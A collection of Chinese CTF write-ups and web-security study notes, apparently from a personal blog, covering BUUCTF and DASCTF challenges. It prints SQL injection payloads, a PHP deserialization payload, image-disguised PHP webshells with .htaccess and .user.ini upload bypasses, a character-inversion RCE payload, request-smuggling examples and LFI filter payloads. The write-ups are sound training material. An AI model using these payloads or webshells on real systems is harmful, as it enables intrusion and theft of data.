中直接嵌入数据的协议\n\n\n\nsign_in1、进去之后显示\n\n于是dirsearch扫描了一下，发现有&#x2F;robots.txt\n\n2、进去查看之后发现被隐藏，不过可以在源码看见\n\n\n3、不过这是一个假的flag，在前面扫描的时候还有一个&#x2F;header.php，进行访问，显示许可被拒，F12查看之后发现cookie是false，\n\n4、修改为ture后，显示要使用PowerPC，于是修改User-Agent\n\n\n5、这串英文提示需要修改Accept\n\n6、修改Accept后成功得到flag\n\nObject1、打开题目查看代码，代码要求get两个参数，一个fl，一个ag，fl要求包含英文字母或者数且后面需要跟一个(，ag则会在fl符合要求后被序列化，然后触发__destruct()，正则匹配ag中的字符，对于形如a()这种前有字符串，后有完整左右括号的进行循环匹配，在下面的eval(‘$a&#x3D;”‘.$this-&gt;cmd.’”;’)中，’.$this-&gt;cmd.’是被双引号包裹起来的，如果此时里面是一个变量形式，比如${phpinfo()}，则会执行phpinfo()\n &lt;?phperror_reporting(0);//flag在flag.php里class flag&#123;    public $cmd=&#x27;index.php&#x27;;    public function __destruct()&#123;        if (preg_match(&#x27;/\\w+\\((?R)?\\)/&#x27;, $this-&gt;cmd))&#123;            eval(&#x27;$a=&quot;&#x27;.$this-&gt;cmd.&#x27;&quot;;&#x27;);        &#125;        else &#123;            die(&#x27;hack!!!&#x27;);        &#125;    &#125;&#125;if (!isset($_GET[&#x27;fl&#x27;]) || !isset($_GET[&#x27;ag&#x27;])) &#123;    die(@highlight_file(&#x27;index.php&#x27;,true));&#125;else &#123;    if (!(preg_match(&#x27;/[A-Za-z0-9]+\\(/i&#x27;, $_GET[&#x27;fl&#x27;]))) &#123;        die(&#x27;hack!!!&#x27;);    &#125;    else &#123;        echo unserialize($_GET[&#x27;ag&#x27;]);    &#125;&#125;  \n\n2、对其写一个脚本：\n&lt;?phpclass flag &#123;    public $cmd;&#125;$a = new flag();$a-&gt;cmd = &#x27;$&#123;phpinfo()&#125;&#x27;;$payload = serialize(array($a));//用数组是因为不用数组生成的payload传上去之后显示为空白，没有内容echo  $payload;\n\n生成payload：\n脚本生成的ag：a:1:&#123;i:0;O:4:&quot;flag&quot;:1:&#123;s:3:&quot;cmd&quot;;s:12:&quot;$&#123;phpinfo()&#125;&quot;;&#125;&#125;完整传参?fl=a(&amp;ag=a:1:&#123;i:0;O:4:&quot;flag&quot;:1:&#123;s:3:&quot;cmd&quot;;s:12:&quot;$&#123;phpinfo()&#125;&quot;;&#125;&#125;\n\n然后搜索flag即可得到，不需要去flag.php里面寻找，而且如果把phpinfo()替换成cat、highlight_file等命令，会被过滤，显示hacker\n\n\n\n知识点在 PHP 双引号字符串中，$&#123;&#125; 会被解析并执行其中的代码","categories":["CTF"],"tags":["web","wp","note"]},{"title":"buuctf平台刷题题解1","url":"/2025/11/28/11.24-11.28buuctf/","content":"平台BUUCTF\n类型SQL\n时间11.24-11.28\n\n[极客大挑战 2019]EasySQL\n先尝试1、1’、1”确定闭合方式\n\n\n确定闭合方式为单引号，因为是简单题，先看看万能密码\n\n\n[极客大挑战 2019]LoveSQL\n这是升级一次的题目，但万能密码依然可以登录，不过里面并没有什么信息\n\n那先测试看有多少列\n\n看来一共三列，那先找数据库\n?username=1&#x27; union select 1,database(),3%23&amp;password=1\n\n\n然后找表\n?username=1&#x27; union select 1,(select (group_concat(table_name)) from information_schema.tables where table_schema=database()),3%23&amp;password=1\n\n\n然后爆字段\n?username=1&#x27; union select 1,(select (group_concat(column_name)) from information_schema.columns where table_schema=database()),3%23&amp;password=1\n\n\n最后爆内容\n?username=1&#x27; union select 1,(select (group_concat(id,username,password)) from l0ve1ysq1),3%23&amp;password=1\n\n\n[极客大挑战 2019]BabySQL\n提示做了严格的过滤，那在注入的时候要优先考虑被过滤的情况了\n\n\n发现union和select都被过滤了，尝试绕过，尝试各种绕过之后发现双写可以绕过，测试列数，依旧直到三才有反应\n?username=1&#x27; ununionion seselectlect 1,2,3%23&amp;password=1\n\n\n然后依旧数据库-&gt;表名-&gt;字段-&gt;内容\n数据库\n?username=1&#x27; ununionion seselectlect 1,database(),3%23&amp;password=1\n\n\n表名（这里发现from和where都被过滤了，而且因为from的过滤，导致information需要写成infoorrmation，双写o和r）\n?username=1&#x27; ununionion seselectlect 1,database(),(seselectlect (group_concat(table_name)) frfromom infoorrmation_schema.tables whwhereere table_schema=database())%23&amp;password=1\n\n\n\n发现有一个b4bsql，想来就在这个里面\n字段\n?username=1&#x27; ununionion seselectlect 1,database(),(seselectlect (group_concat(column_name)) frfromom infoorrmation_schema.columns whwhereere table_schema=database())%23&amp;password=1\n\n\n内容\n?username=1&#x27; ununionion seselectlect 1,database(),(seselectlect (group_concat(id,username,password)) frfromom geek.b4bsql)%23&amp;password=1\n\n\n[极客大挑战 2019]HardSQL\n使用之前的payload已经行不通了，试了一会，发现诸如order by，union，空格，等号什么的都被过滤了，双写也绕不过，于是网上找了另外一种方式，报错注入\n数据库\n?username=1&#x27;or(extractvalue(1,concat(0x7e,database(),0x7e)))%23&amp;password=1\n\n\n由于空格被过滤，payload里面需要用大量的括号来绕过空格，等号需要用like来绕过\n表\n?username=1&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23&amp;password=1\n\n\n字段\n?username=1&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e)))%23&amp;password=1\n\n\n内容\n?username=1&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(geek.H4rDsq1)),0x7e)))%23&amp;password=1\n\n\n这里用的是extractvalue，其默认长度限制为32个字符，所以flag不完整，我们还需要用right来获取右半边flag\n?username=1&#x27;or(extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e)))%23&amp;password=1\n\n\n获取到的两段flag\nflag{2a0e6d57-cf0a-4c44-ac\n7-cf0a-4c44-acac-bf180a8fa384}\n去除重复部分后拼接为完整flag：flag{2a0e6d57-cf0a-4c44-acac-bf180a8fa384}\n[SUCTF 2019]EasySQL\n输入1没问题\n\n输入1 or 1#就Nonono，可能是or或者#被过滤\n输入1 or 1&#x3D;1也输出Nonono，说明or被过滤\n然后试了一些最常用的比如union、select、where、from之类的都不行，包括extractvalue也不行，都被过滤了，没招了，去网上找了一下，发现要用堆叠注入\n数据库\n1;show databases;#\n\n\n成功输出，趁热打铁找表\n1;show tables;#\n\n\n但是因为select等字符过滤，正常手法难以输出，但是1的时候会有回显，那0如何？\n\n\n没有回显，那应该存在||或or运算符，可以使用PIPES_AS_CONCAT将||变为连接符号\n1;sql_mode=PIPES_AS_CONCAT;select 1\n\n不过我的不知道为什么这个没有输出flag，所以借用一下薅过来的图\n\n也可以用\n*,1\n\n\n因为它的后台语句是这样的\n$sql = &quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;; \n\n把这个拼接进去就变成了\nselect * , 1 || flag from Flag\n\n它会新增一列1并输出Flag里面的所有内容\n","categories":["CTF"],"tags":["web","wp","note"]},{"title":"buuctf平台刷题题解2","url":"/2025/12/07/12.1-12.7buuctf/","content":"平台BUUCTF\n时间12.1-12.7\n[GXYCTF2019]BabyUpload题目给出了源码地址，那我们先进去看看\n\n源码的内容为:\n&lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Upload&lt;/title&gt;&lt;form action=\\&quot;\\&quot; method=\\&quot;post\\&quot; enctype=\\&quot;multipart/form-data\\&quot;&gt;上传文件&lt;input type=\\&quot;file\\&quot; name=\\&quot;uploaded\\&quot; /&gt;&lt;input type=\\&quot;submit\\&quot; name=\\&quot;submit\\&quot; value=\\&quot;上传\\&quot; /&gt;&lt;/form&gt;&quot;;error_reporting(0);if(!isset($_SESSION[&#x27;user&#x27;]))&#123;    $_SESSION[&#x27;user&#x27;] = md5((string)time() . (string)rand(100, 1000));&#125;if(isset($_FILES[&#x27;uploaded&#x27;])) &#123;    $target_path  = getcwd() . &quot;/upload/&quot; . md5($_SESSION[&#x27;user&#x27;]);    $t_path = $target_path . &quot;/&quot; . basename($_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;]);    $uploaded_name = $_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;];    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,&#x27;.&#x27;) + 1);    $uploaded_size = $_FILES[&#x27;uploaded&#x27;][&#x27;size&#x27;];    $uploaded_tmp  = $_FILES[&#x27;uploaded&#x27;][&#x27;tmp_name&#x27;];     if(preg_match(&quot;/ph/i&quot;, strtolower($uploaded_ext)))&#123;        die(&quot;后缀名不能有ph！&quot;);    &#125;    else&#123;        if ((($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;            &quot;) || ($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)) &amp;&amp; ($_FILES[&quot;uploaded&quot;][&quot;size&quot;] &lt; 2048))&#123;            $content = file_get_contents($uploaded_tmp);            if(preg_match(&quot;/\\&lt;\\?/i&quot;, $content))&#123;                die(&quot;诶，别蒙我啊，这标志明显还是php啊&quot;);            &#125;            else&#123;                mkdir(iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, $target_path), 0777, true);                move_uploaded_file($uploaded_tmp, $t_path);                echo &quot;&#123;$t_path&#125; succesfully uploaded!&quot;;            &#125;        &#125;        else&#123;            die(&quot;上传类型也太露骨了吧！&quot;);        &#125;    &#125;&#125;?&gt;\n\n分析源码，发现源码有几个过滤规则：\n1、会提取文件后缀名，不允许包含ph字符\n2、只允许图片类型为image&#x2F;pjpeg和image&#x2F;pjpeg\n3、图片大小不能超过2048字节\n4、文件的内容不能包含&lt;?字符，过滤了php标签\n对于这个过滤规则，我们可以使用.htaccess配置文件来绕过\n我们先创建一个文本，写入如下内容，然后重命名为.htaccess.jpg\nAddType application/x-httpd-php .jpg\n\n然后抓包删去.jpg再发送\n\n上传成功\n然后同样的我们创建另一个文本文档，写入如下内容之后，重命名为1.jpg\nGIF89a&lt;script language=&quot;php&quot;&gt;    eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;\n\n同样上传\n\n然后用蚁剑连接\n\n查看根目录，发现flag\n\n成功得到flag\n\n[SUCTF 2019]CheckIn该题一样给出了源码，先去看看源码\n\n源码内容如下：\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;    &lt;title&gt;Upload Labs&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;Upload Labs&lt;/h2&gt;    &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;        &lt;input type=&quot;file&quot; name=&quot;fileUpload&quot; id=&quot;file&quot;&gt;&lt;br&gt;        &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;提交&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php// error_reporting(0);$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);if (!file_exists($userdir)) &#123;    mkdir($userdir, 0777, true);&#125;file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);if (isset($_POST[&quot;upload&quot;])) &#123;    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];    if (!$tmp_name) &#123;        die(&quot;filesize too big!&quot;);    &#125;    if (!$name) &#123;        die(&quot;filename cannot be empty!&quot;);    &#125;    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;        die(&quot;illegal suffix!&quot;);    &#125;    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;        die(&quot;&amp;lt;? in contents!&quot;);    &#125;    $image_type = exif_imagetype($tmp_name);    if (!$image_type) &#123;        die(&quot;exif_imagetype:not image!&quot;);    &#125;    $upload_file_path = $userdir . &quot;/&quot; . $name;    move_uploaded_file($tmp_name, $upload_file_path);    echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;;    echo &#x27;Your files : &lt;br&gt;&#x27;;    var_dump(scandir($userdir));&#125;\n\n分析源码得到其中的过滤规则如下：\n1、拦截过大文件和空名文件\n2、以文件名最后一个点号作为文件名后缀进行检测，不允许包含ph或htacess字符\n3、读取文件内容，不允许包含&lt;?字符\n4、读取文件头前几位，判断是否为标准图片头\n这题一开始用的.htaccess文件，因为源码中写的是htacess，少了一个c，所以是可以上传的，但是当我把配置文件和木马图都上传之后，传参和蚁剑连接都不行，因为它后台貌似并没有解析这个PHP代码，于是去网上冲浪了一会，找到了用.user.ini配置文件，以php方式解析指定文件的方法\n我们创建一个文本，写入如下内容，然后重命名为.user.ini\nGIF89aauto_prepend_file=1.jpg\n\n再创建一个文本，写入如下内容，重命名为1.jpg（上个题目原样的木马图直接套用即可）\nGIF89a&lt;script language=&quot;php&quot;&gt;    eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;\n\n将其都上传\n\n然后就可以用蚁剑连接或者传参了（需要在url最后加上&#x2F;index.php）\n\n然后即可得到flag\n\n知识点1、.user.ini文件\n介绍：.user.ini 是 PHP 从 5.3.0 版本 开始引入的用户级分布式配置文件，属于 PHP 解释器层面的配置（而非 Web 服务器配置），作用是在指定目录下自定义 PHP 的运行时规则 作用范围：当前目录与子目录要求版本：PHP 版本\t≥\t5.3.0\n\n2、auto_prepend_file与auto_append_file\nauto_prepend_file\t指定在主文件之前自动解析的文件名auto_append_file\t指定在主文件之后自动解析的文件名一个是前一个是后，我们这里用的是主文件之前，也就是上面那个\n\n3、为什么需要在url最后加上&#x2F;index.php\n.user.ini生效需要有一个主文件进行解析，我们用的auto_prepend_file它是自动包含并解析在主文件之前的文件名，我们是要它在解析index.php之前顺带把我们的木马图进行解析了\n\n4、为什么.htaccess没被过滤也不生效\n因为服务器为nginx，文件不生效QAQ\n\n[GXYCTF2019]BabySQli题目是SQli，那应该是sql注入没跑，进去先测试闭合方式\n\n闭合方式为单引号，且响应中附带了一些编码，尝试一番之后，是base32套base64\n\n\n解码出来为select * from user where username &#x3D; ‘$name’；是一句sql语句，告诉我们这题的注入点为name，且为单引号闭合\n我们进行列数测试，输到1’ union select 1,2,3 #出现了wrong user的字样，说明有三列\n\n本想从数据库一路找下去，但是刚开始就死了，database()被过滤了\n\n然后回到题目去看了search.php的源码：\n&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;Do you know who am I?&lt;/title&gt;&lt;?phprequire &quot;config.php&quot;;require &quot;flag.php&quot;;// 去除转义if (get_magic_quotes_gpc()) &#123;\tfunction stripslashes_deep($value)\t&#123;\t\t$value = is_array($value) ?\t\tarray_map(&#x27;stripslashes_deep&#x27;, $value) :\t\tstripslashes($value);\t\treturn $value;\t&#125;\t$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);\t$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);\t$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);\t$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);&#125;mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);$name = $_POST[&#x27;name&#x27;];$password = $_POST[&#x27;pw&#x27;];$t_pw = md5($password);$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;// echo $sql;$result = mysqli_query($con, $sql);if(preg_match(&quot;/\\(|\\)|\\=|or/&quot;, $name))&#123;\tdie(&quot;do not hack me!&quot;);&#125;else&#123;\tif (!$result) &#123;\t\tprintf(&quot;Error: %s\\n&quot;, mysqli_error($con));\t\texit();\t&#125;\telse&#123;\t\t// echo &#x27;&lt;pre&gt;&#x27;;\t\t$arr = mysqli_fetch_row($result);\t\t// print_r($arr);\t\tif($arr[1] == &quot;admin&quot;)&#123;\t\t\tif(md5($password) == $arr[2])&#123;\t\t\t\techo $flag;\t\t\t&#125;\t\t\telse&#123;\t\t\t\tdie(&quot;wrong pass!&quot;);\t\t\t&#125;\t\t&#125;\t\telse&#123;\t\t\tdie(&quot;wrong user!&quot;);\t\t&#125;\t&#125;&#125;?&gt;\n\n1、过滤了()、&#x3D;、or字符\n2、需要传入的密码的md5值与密码字段相等方可输出flag\n那我们可以构造payload:\nname=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1\n\n\n成功获取flag\n[GYCTF2020]Blacklist进来先探测闭合方式，发现是单引号闭合\n\n注入1’ union select 1,2 #时提示被过滤\n\n禁用掉了一些常用的关键字，我们转变方式用堆叠注入\n查数据库\n1&#x27;;show databases;#\n\n\n查表\n1&#x27;;show tables;#\n\n\n查字段\n1&#x27;;show columns from FlagHere;#\n\n\n到这里已经很接近flag了，但是常用的查询语句的关键字被ban掉了，于是我去找了一些不那么常用的：handler\nhandler table_name open;handler table_name read next;handler table_name close;\n\n修改为对应表名，然后加上头和尾\n1&#x27;;handler FlagHere open;handler FlagHere read next;handler FlagHere close;#\n\n\n成功得到flag\n知识点handler\nhandler是MYSQL的特有关键字，用于直接访问表的存储引擎接口，可以作为select和show的替代方案\n语法：handler 表名 [open/close]\t\t\t打开或关闭某个表handler 表名 read [first/next]\t读取某个表的第一行或者下一行\n\n\n\n\n\n\n\n\n\n[RoarCTF 2019]Easy Java（进去之后试了很久，sql注入，口令爆破什么的都试了，一点反应都没有，然后就去网上找教程了）\n点击页面中的help，可以看到\n\n\n可以看到页面尝试get请求这个文件，但是没有反应，我们将它换成post请求，即可下载文件\n\n打开发现并没有什么有用的信息\n\n我们将目标转换到web.xml\n\n打开web.xml\n\n可以查看到Flag文件的位置\n\n打开文件\n\n得到flag的base64编码，将其解码即可得到flag\n\n知识点WEB-INF\n主要包含以下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件\n\n\n\n\n\n\n\n\n\n[极客大挑战 2019]RCE ME先看给出的源码：\n &lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123;            $code=$_GET[&#x27;code&#x27;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;\n\n分析源码，不能使用字母和数字，想要获取flag却又需要注入命令，而限制字符数要小于40\n理论上来说我们能使用的只有各种符号，那么我们想构造命令的话就得通过异或，取反，自增等手段来获得想要的字符\n自增通常比较长，这里有长度限制，非常容易超出上限，不考虑\n取反方式先将php命令进行取反，变成不可打印字符，然后url编码，最后在url编码前面加一个~，这样在被传进去后，先会被解码，然后因为是不可打印字符，所以可以绕过正则匹配，再然后因为前面加了~，~是取反符号，会再进行一次取反，然后得到原本的php命令，从而绕过正则匹配机制达到想要的目的\n\n异或方式因为两次异或会得到原值，且不可打印字符是可以绕过正则匹配的那么用不可打印字符异或出我们需要的命令是完全可能的\n\n因为取反比较简单，而且可以用个短小的脚本来生成payload，所以我这里用的是取反，简单写个脚本帮我们做取反和url编码的事情\n&lt;?php$a=&#x27;&#x27;;$b=urlencode(~$a);echo &#x27;(&#x27; .&#x27;~&#x27;. $b . &#x27;)&#x27;;$c=&#x27;&#x27;;$d=urlencode(~$c);echo &#x27;(&#x27; .&#x27;~&#x27;. $d . &#x27;)&#x27;;?&gt;\n\n对于这种有字符限制的，我通常会先用phpinfo()，因为很多这种payload写起来可能比较麻烦的题，会为了降低难度把flag直接藏在环境变量里面，就算没有，环境变量很多时候也能显示一些的信息，所以第一个payload：\n?code=(~%8F%97%8F%96%91%99%90)();\n\n不过这里很可惜没有flag，但是可以看到被ban掉了n多的函数方法\n\n所以我打算塞个一句话木马，然后用蚁剑进行连接，这样比较轻松一点\n?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8B%9A%8C%8B%A2%D6%D6);\n\n成功连接\n\n可以看到有一个flag和一个readflag，先打开flag看看\n\n发现是空的，再看看readflag\n\n好像是个可以执行的文件，应该是用来输出flag的，但是我发现因为disable_functions的存在，我们没有执行&#x2F;readflag的权限，这里可以用蚁剑中的一个插件来解决\n\n加载插件，选择PHP7_GC_UAF模式\n\n然后右键ip地址，打开虚拟终端，执行&#x2F;readflag即可\n\n当然也有另外的方式，是利用动态链接库—— LD_PRELOAD，但是我现在不会\nhttps://blog.csdn.net/m0_62879498/article/details/124803318\n这是文章地址，可以参考\n","categories":["CTF"],"tags":["web","wp","note"]},{"title":"绕过学习笔记","url":"/2025/11/12/Bypass/","content":"字符绕过1、大小写绕过2、双写绕过3、通配符绕过*\n\n4、反斜杠转义绕过\\\n\n5、字符串拼接+|\n\n6、参数逃逸假设一串代码如下：&lt;?php   $c = $_GET[&#x27;c&#x27;];  if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |/i&quot;,$c))   //这里还过滤的.和空格  &#123;      eval($c);&#125;?&gt;\n\n我们可以构造另一个参数来绕过：url?c=eval($_GET[&#x27;a&#x27;]);&amp;a=cat flag.php;\n\n7、空白符合绕过制表符 (%09)换行符 (%0a)回车符 (%0d)垂直制表符 (%0b)\n\n8、内联注释 (MySQL特有)例如：uni/**/on\n\n9、空格绕过在Linux中，空格可以替换为以下几种：$IFS\t\t\t\t\tShell的内部字段分隔符变量$&#123;IFS&#125;\t\t\t\t\t更规范的变量引用方式$IFS$9 或 $IFS$1\t\t\t$9代表第9个参数，常为空字符串，用于截断后续内容&lt;&gt;\t\t\t\t\t\t以读写方式打开文件，同样可替代空格%20\t\t\t\t\t\t常用于URL场景，代表空格%09\t\t\t\t\t\t常用于URL场景，代表制表符(Tab)\n\n10、空字符截断在PHP版本小于5.3.4时可以尝试使用%00进行截断\n\n11、目录遍历绕过../../\n\n\n\n编码绕过1、Base64编码绕过2、URL编码绕过可双重编码绕过，因为有些只解码一次\n\n3、Unicode编码绕过主要用于绕过对特定字符的过滤\n\n4、16进制编码绕过在SQL注入中经常用于绕过对字符串的检测\n\n5、HTML编码绕过主要用于绕过XSS过滤\n\n协议绕过1、HTTP参数污染同一个参数名，在一次上传时同时赋予多个值，如：?id=1&amp;id=2可能只会判定前一个id=1而忽略后面的id=2\n\n2、HTTP请求走私利用前后端对请求头部处理的边界不同，使请求被解析成了两个不同的完整请求Content-Length 头部（CL)Transfer-Encoding 头部(TE)\n1、CL.TE 走私原理：前端服务器信任 Content-Length 头部，而后端服务器信任 Transfer-Encoding 头部。攻击Payload构造：\nPOST / HTTP/1.1Host: vulnerable-website.comContent-Length: 13Transfer-Encoding: chunked0SMUGGLED\n\n前端视角：看到 CL&#x3D;13，它会将整个Body（即 0\\r\\n\\r\\nSMUGGLED，共13个字节）转发给后端。后端视角：看到 TE: chunked，它开始解析分块。第一块是 0，表示结束。所以它认为第一个请求到此为止。结果：字节 SMUGGLED 没有被后端当作第一个请求的一部分，而是被留在了缓冲区内，成为了下一个请求的开头。\n2、TE.CL 走私原理：前端服务器信任 Transfer-Encoding 头部，而后端服务器信任 Content-Length 头部。攻击Payload构造：\nPOST / HTTP/1.1Host: vulnerable-website.comContent-Length: 3Transfer-Encoding: chunked8SMUGGLED0\n\n前端视角：看到 TE: chunked。它解析分块：第一块长8字节，内容是 SMUGGLED；第二块长0，结束。所以它将整个Body（SMUGGLED）转发给后端。后端视角：看到 CL&#x3D;3，它只从Body中读取3个字节（即 8\\r\\n），然后就认为这个请求结束了。结果：剩余的字节 SMUGGLED\\r\\n0\\r\\n\\r\\n 被留在了缓冲区内，成为了下一个请求的开头。\n3、HTTP方法覆盖操作：使用POST方法，但携X-HTTP-Method-Override: PUT头部。原因：WAF可能只检查标准的GET/POST方法，但后端框架会解析这个头部，将请求当作PUT方法处理，从而执行了WAF未检查的逻辑\n\n\n\n文件上传绕过1、扩展名绕过1、使用未被禁用的后缀绕过2、后缀里面使用大小写来混淆，如a.Php3、最末尾加一个.号，如a.php.4、使用双拓展名，如a.jpg.php或a.php.jpg5、使用不常见拓展名绕过，假如禁用.php后缀，可以使用.php4、.php5、.phtml等后缀6、上传时用bp拦截请求，在其中修改文件后缀，用于绕过前端校验\n\n2、文件头绕过在构造的恶意文件开头加上图片或者其他的魔术字节，用于绕过服务器的文件头检查\n\n3、.htaccess文件上传绕过上传一个.htaccess配置文件，修改服务器配置，让其解析指定后缀文件为php文件进行执行仅Apache服务器\n\n4、图片元数据绕过1、用010Editor在图片编码末尾后面添加恶意代码2、用exiftool工具向图片的Exif信息中写入PHP代码：exiftool -Comment=&#x27;&lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;&#x27; image.jpg然后通过文件包含漏洞来执行这张图片中的代码\n\n","categories":["CTF"],"tags":["web","note"]},{"title":"DASCTF2025-SecretPhotoGallery-Wp","url":"/2025/12/06/DASCTF2025-SecretPhotoGallery/","content":"SecretPhotoGallery-WP时间12.6\n先打开题目\n\n可以看到是一个登录界面，登陆界面那可能是sql注入，弱口令爆破，cookie中的jwt令牌伪造等，此处的话经过尝试可以确认是sql注入，闭合为单引号，尝试探测后用1’ union select 1,2,3 –成功登录\n1&#x27; union select 1,2,3 --\n\n\n登陆完成之后看到有很多图片，且显示Welcome加刚刚输入的username，那么从这个Welcome的显示看来是直接把username的输入进行打印，并不会执行然后输出执行结果，那么我们现在应该找找其他信息，在Welcome的下一行有一个加粗的guest，显示我们是游客身份，那接下来应该是要获取管理员身份\n\n我们在cookie中发现了jwt的令牌，拿去解析一下\n\n发现需要密钥，那我们去其他地方找找信息，比如源码、响应头什么的\n\n我们在源码中发现了一长串的这个页面图片的名字及ID，仔细看ID会发现，它的第一个字母拼起来是GALLERY2024SECRET，有没有感觉很像特殊的东西，比如密钥\n\n经过验证确实是密钥，于是我们伪造admin令牌\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjUwNzI0OTh9.NrqvKNtiU1oMMHBmtdSVjQedgYiuQ1ETCzLh67koI9g\n\n\n更换令牌刷新页面\n\n成功登录管理员界面，点击蓝色按钮进入admin管理界面\n\n发现可以读取文件，尝试各种读取，比如&#x2F;flag、&#x2F;flag.txt、&#x2F;flag.php\n\n\n\n发现都不行，但是警告信息显示是include函数，而且输入文件名的框下面还有一串英文，意思是需要绝对路径，那么意味着flag所在的地方是常见的地方，可以直接猜到或者经过简单的尝试之后找到，比如就在这个工作路径下\n\n\n输出成功没有显示，那我们得用伪协议来读取了\nphp://filter/read=conver.base64-encode/resource=flag.phpphp://filter/read=string.rot13/resource=flag.php\n\n\n\n发现两个过滤器都被ban了，然后我找了其他的一些过滤器进行尝试，比如zlib压缩、字符转换什么的，这里用字符转换把utf-8转换utf-16就可以了，但是我当时找到这个过滤器的时候复制过来忘记改了，我自己也没发现，它用的是utf-8转gbk，然后就一直没出-_-\nphp://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php\n\n\n","categories":["CTF"],"tags":["web","wp"]},{"title":"文件包含学习笔记","url":"/2025/11/14/LFI-RFI/","content":"LFI与RFI文件包含分本地文件包含(LFI)和远程文件包含(RFI)。\n如果php.ini配置文件中allow_url_fopen和allow_url_include都为Off，就无法远程包含文件。\n在PHP4中RFI与LFI都存在，而到了PHP5.2.0之后，allow_url_include默认条件下为Off，无法远程包含文件，所以主要是本地文件包含。\n基本函数include() ：包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行。include_once()：跟include函数作用几乎相同，只是会在导入函数之前先检测该文件是否被导入。如果已经执行一遍就不重复执行。require()：跟include唯一不同的是，当产生错误时候，include会继续运行而require停止运行。require_once()：与include_once()相同，先检测，如果已经存在就不会重复执行。\n\n成因文件包含漏洞是代码注入的一种。其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行，代码注入的典型代表就是文件包含。服务器通过函数去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到目的。\n本地文件包含条件1、allow_url_fopen&#x3D;On\n2、有动态变量可以控制\n方法1、获取绝对路径：可以随便包含一个不存在的文件来引发报错，在报错信息里会显示绝对路径。\n2、包含用户上传的文件：比如我们自己上传的一句话木马。\n3、包含伪协议：data、php、file等。\n4、包含Session 